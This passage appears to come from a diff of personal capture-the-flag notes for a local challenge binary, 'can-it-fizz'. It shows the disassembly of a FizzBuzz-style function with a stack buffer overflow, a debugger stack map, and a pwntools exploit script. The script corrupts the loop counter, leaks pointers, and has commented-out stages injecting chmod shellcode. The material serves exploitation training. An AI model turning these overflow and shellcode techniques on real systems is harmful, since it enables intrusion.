+   0x00000000000012af <+198>:   movsxd rax,ecx
+   0x00000000000012b2 <+201>:   imul   rax,rax,0x55555556
+   0x00000000000012b9 <+208>:   shr    rax,0x20
+   0x00000000000012bd <+212>:   mov    rdx,rax
+   0x00000000000012c0 <+215>:   mov    eax,ecx
+   0x00000000000012c2 <+217>:   sar    eax,0x1f
+   0x00000000000012c5 <+220>:   mov    esi,edx
+   0x00000000000012c7 <+222>:   sub    esi,eax
+   0x00000000000012c9 <+224>:   mov    eax,esi
+   0x00000000000012cb <+226>:   mov    edx,eax
+   0x00000000000012cd <+228>:   add    edx,edx
+   0x00000000000012cf <+230>:   add    edx,eax
+   0x00000000000012d1 <+232>:   mov    eax,ecx
+   0x00000000000012d3 <+234>:   sub    eax,edx
+   0x00000000000012d5 <+236>:   test   eax,eax
+   0x00000000000012d7 <+238>:   jne    0x12e6 <challenge+253>
+   0x00000000000012d9 <+240>:   lea    rax,[rip+0x2d30]        # 0x4010 <fizz>
+   0x00000000000012e0 <+247>:   mov    QWORD PTR [rbp-0x18],rax
+   0x00000000000012e4 <+251>:   jmp    0x132c <challenge+323>
+   0x00000000000012e6 <+253>:   mov    ecx,DWORD PTR [rbp-0x1c]
+   0x00000000000012e9 <+256>:   movsxd rax,ecx
+   0x00000000000012ec <+259>:   imul   rax,rax,0x66666667
+   0x00000000000012f3 <+266>:   shr    rax,0x20
+   0x00000000000012f7 <+270>:   mov    edx,eax
+   0x00000000000012f9 <+272>:   sar    edx,1
+   0x00000000000012fb <+274>:   mov    eax,ecx
+   0x00000000000012fd <+276>:   sar    eax,0x1f
+   0x0000000000001300 <+279>:   sub    edx,eax
+   0x0000000000001302 <+281>:   mov    eax,edx
+   0x0000000000001304 <+283>:   mov    edx,eax
+   0x0000000000001306 <+285>:   shl    edx,0x2
+   0x0000000000001309 <+288>:   add    edx,eax
+   0x000000000000130b <+290>:   mov    eax,ecx
+   0x000000000000130d <+292>:   sub    eax,edx
+   0x000000000000130f <+294>:   test   eax,eax
+   0x0000000000001311 <+296>:   jne    0x1321 <challenge+312>
+   0x0000000000001313 <+298>:   lea    rax,[rbp-0x70]
+   0x0000000000001317 <+302>:   add    rax,0x4c
+   0x000000000000131b <+306>:   mov    QWORD PTR [rbp-0x18],rax
+   0x000000000000131f <+310>:   jmp    0x132c <challenge+323>
+   0x0000000000001321 <+312>:   lea    rax,[rip+0x2cf8]        # 0x4020 <nothing>
+   0x0000000000001328 <+319>:   mov    QWORD PTR [rbp-0x18],rax
+   0x000000000000132c <+323>:   mov    eax,DWORD PTR [rbp-0x1c]
+   0x000000000000132f <+326>:   mov    esi,eax
+   0x0000000000001331 <+328>:   lea    rdi,[rip+0xce2]        # 0x201a
+   0x0000000000001338 <+335>:   mov    eax,0x0
+   0x000000000000133d <+340>:   call   0x10d0 <printf@plt>
+   0x0000000000001342 <+345>:   lea    rax,[rbp-0x70]
+   0x0000000000001346 <+349>:   add    rax,0x14
+   0x000000000000134a <+353>:   mov    edx,0x100
+   0x000000000000134f <+358>:   mov    rsi,rax
+   0x0000000000001352 <+361>:   mov    edi,0x0
+   0x0000000000001357 <+366>:   call   0x10e0 <read@plt>
+   0x000000000000135c <+371>:   lea    rax,[rbp-0x70]
+   0x0000000000001360 <+375>:   add    rax,0x14
+   0x0000000000001364 <+379>:   mov    rsi,rax
+   0x0000000000001367 <+382>:   lea    rdi,[rip+0xcb1]        # 0x201f
+   0x000000000000136e <+389>:   mov    eax,0x0
+   0x0000000000001373 <+394>:   call   0x10d0 <printf@plt>
+   0x0000000000001378 <+399>:   mov    BYTE PTR [rbp-0x5c],0x0
+   0x000000000000137c <+403>:   mov    rdx,QWORD PTR [rbp-0x18]
+   0x0000000000001380 <+407>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000001384 <+411>:   mov    rsi,rdx
+   0x0000000000001387 <+414>:   mov    rdi,rax
+   0x000000000000138a <+417>:   call   0x10b0 <strcpy@plt>
+   0x000000000000138f <+422>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000001393 <+426>:   mov    rsi,rax
+   0x0000000000001396 <+429>:   lea    rdi,[rip+0xc93]        # 0x2030
+   0x000000000000139d <+436>:   mov    eax,0x0
+   0x00000000000013a2 <+441>:   call   0x10d0 <printf@plt>
+   0x00000000000013a7 <+446>:   mov    eax,DWORD PTR [rbp-0x1c]
+   0x00000000000013aa <+449>:   add    eax,0x1
+   0x00000000000013ad <+452>:   mov    DWORD PTR [rbp-0x1c],eax
+   0x00000000000013b0 <+455>:   mov    edx,DWORD PTR [rbp-0x1c]
+   0x00000000000013b3 <+458>:   mov    eax,DWORD PTR [rbp-0x70]
+   0x00000000000013b6 <+461>:   cmp    edx,eax
+   0x00000000000013b8 <+463>:   jl     0x126c <challenge+131>
+   0x00000000000013be <+469>:   nop
+   0x00000000000013bf <+470>:   leave
+   0x00000000000013c0 <+471>:   ret
+End of assembler dump.
+```
 
 ```
 pwndbg> break *(challenge+366)
@@ -13120,11 +13658,144 @@ pwndbg> x/30gx $rsi-0x4
 0x7ffded2c73d0: 0x0000000000000000      0x0000000000000000
 ```
 
+Address,Value (Hex),Explanation
+0x7ffded2c72f0,0000000000000000,"(Address starts at ...2f4, so first 4 bytes are padding)"
+0x7ffded2c72f8,0000000000000000,buf[3]
+...,...,...
+0x7ffded2c7328,7a7a754200000000,"buf[9]. Note 7a7a7542 is ""Buzz""."
+0x7ffded2c7330,000000000000000a,buf[10]. The 0a is the counter (current iteration 10).
+0x7ffded2c7334,00000000,HIDWORD(buf[10]) — THIS IS YOUR TARGET.
+0x7ffded2c7338,00005fed7d55d018,"buf[11] (Pointer to ""Correct Answer"")"
+0x7ffded2c7340,00007ffded2c72e4,buf[12] (Pointer to buffer + 4)
+0x7ffded2c7358,00005fed7d55a466,Saved RIP (Return Address)
+
 - [x] Location of buffer: `0x7ffded2c72f4`
 - [x] Location of pointer to leak: `0x7ffded2c7340`
 - [x] Required number of bytes: `76`
 
+### Exploit
 
 ```py
+from pwn import *
 
+context.arch = "amd64"
+
+# Initialize data
+buffer_addr = 0x7ffded2c72f4
+counter_value = 0x80000005          # -20
+counter_addr = 0x7ffded2c7334
+buf_11_ptr_addr = 0x7ffded2c7338
+buf_12_ptr_addr = 0x7ffded2c7340
+addr_to_saved_ip = 0x7ffded2c7358
+offset_to_counter = (counter_addr - buffer_addr)                    # 64 bytes
+offset_to_buf_11_ptr = buf_11_ptr_addr - (counter_addr + 4)         # 
+offset_t0_buf_12_ptr = buf_12_ptr_addr - (buf_11_ptr_addr + 8)
+offset_to_ret = addr_to_saved_ip - (buf_12_ptr_addr + 8)
+
+p = process("/challenge/can-it-fizz")
+
+# ---- Stage 1: v[11] leak ----
+p.recvuntil(b"0: ")
+
+# Craft payload
+payload = b"A" * 4                                              # buf[2] Last 4 bytes
+payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # buf[3] ... buf[8] 48 bytes
+payload += b"C" * 4                                             # buf[9] First 4 bytes
+payload += b"BUFF"                                      # buf[9] Last 4 bytes
+payload += b"D" * 4                  # buf[10] First 4 bytes (LODWORD)
+payload += p32(counter_value)                           # buf[10] Last 4 bytes (HIDWORD)
+
+# Send payload
+p.send(payload)
+
+# # Extract relevant pointer
+# p.recvuntil(b"\xfb\xff\xff\xff")
+# buf_11_ptr_raw = p.recv(6)
+# buf_11_ptr = u64(buf_11_ptr_raw.ljust(8, b"\x00"))
+# log.success(f"v[11] pointer raw: {buf_11_ptr}")
+# log.success(f"v[11] pointer hex: {hex(buf_11_ptr)}")
+
+
+# # ---- Stage 2: v[12] leak ----
+# # Craft payload
+# payload = b"A" * 4                                      # buf[2] Last 4 bytes
+# payload += b"B" * (offset_to_counter - (4 + 8))         # buf[1] ... buf[8] All 8 bytes
+# payload += b"C" * 4                                     # buf[9] First 4 bytes
+# payload += b"BUZZ"                                      # buf[9] Last 4 bytes
+# payload += b"D" * 4                                     # buf[10] First 4 bytes
+# payload += p32(counter_value)                           # buf[10] Last 4 bytes
+# payload += p64()
+
+# # Send payload
+# p.send(payload)
+
+# # Extract relevant pointer
+# p.recvuntil(b"BBBBBBBB")
+# v_12_ptr_raw = p.recv(6)
+# v_12_ptr = u64(v_12_ptr_raw.ljust(8, b"\x00"))
+# log.success(f"v[12] pointer raw: {v_12_ptr}")
+# log.success(f"v[12] pointer hex: {hex(v_12_ptr)}")
+
+
+# # ---- Stage 3: shellcode ----
+# shellcode_asm = """
+#    /* chmod("z", 0004) */
+#    push 0x5a
+#    push rsp
+#    pop rdi
+#    pop rax
+#    mov sil, 0x4
+#    syscall
+# """
+# shellcode_addr = v_12_ptr - 16
+# shellcode = asm(shellcode_asm)
+# len_shellcode = len(shellcode)
+
+# # Craft payload
+# payload = shellcode
+# payload = b"A" * (offset_to_counter - len_shellcode)
+# payload += p64(counter_value)
+# payload += b"B" * 8
+# payload += p64(shellcode_addr)
+
+# # Send payload
+# p.send(payload)
+
+p.interactive()
+```
+
+
+```
+payload:
+counter_value = 0xfffffffb
+
+payload = b"A" * 4                                              # buf[2] Last 4 bytes
+payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # buf[3] ... buf[8] 48 bytes
+payload += b"C" * 4                                             # buf[9] First 4 bytes
+payload += b"BUFF"                                      # buf[9] Last 4 bytes
+payload += b"D" * 4                  # buf[10] First 4 bytes (LODWORD)
+payload += p32(counter_value)                           # buf[10] Last 4 bytes (HIDWORD)
+
+5: $ 
+You entered: 
+AAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCBUFFDDDD\x05
+Correct answer: BUFFDDDD\x05
+```
+
+
+```
+
+payload:
+counter_value = 0xfffffffffffffffb
+
+payload = b"A" * 4                                              # buf[2] Last 4 bytes
+payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # buf[3] ... buf[8] 48 bytes
+payload += b"C" * 4                                             # buf[9] First 4 bytes
+payload += b"BUFF"                                      # buf[9] Last 4 bytes
+payload += p64(counter_value)                           # buf[10] 8 bytes
+
+5: $ 
+You entered: 
+AAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCBUFF\xfb\xff\xff\xff\x05
+Correct answer: BUFF\xfb\xff\xff\xff\x05
 ```
